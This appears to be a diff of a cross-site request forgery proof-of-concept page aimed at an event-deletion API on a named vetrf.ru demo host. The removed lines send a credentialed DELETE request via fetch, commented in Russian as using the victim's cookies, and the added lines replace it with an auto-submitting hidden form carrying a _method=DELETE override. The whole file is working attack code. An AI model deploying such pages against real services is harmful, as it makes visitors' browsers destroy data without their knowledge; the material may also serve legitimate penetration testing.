@@ -1,20 +1,10 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="utf-8">
-  <title>CSRF PoC DELETE</title>
-</head>
+<head><meta charset="utf-8"></head>
 <body>
-  <script>
-    // Автоматическая отправка DELETE-запроса с куками жертвы
-    fetch('https://demo-herriot.vetrf.ru/api/events/2024/00017', {
-      method: 'DELETE',
-      credentials: 'include',           // отправляем куки
-      headers: {
-        'X-Requested-With': 'XMLHttpRequest',
-        'Accept': 'application/json, text/plain, */*'
-      }
-    }).catch(() => {});
-  </script>
+  <form id="csrf" action="https://demo-herriot.vetrf.ru/api/events/2024/00017" method="POST">
+    <input type="hidden" name="_method" value="DELETE">
+  </form>
+  <script>document.getElementById('csrf').submit();</script>
 </body>
 </html>
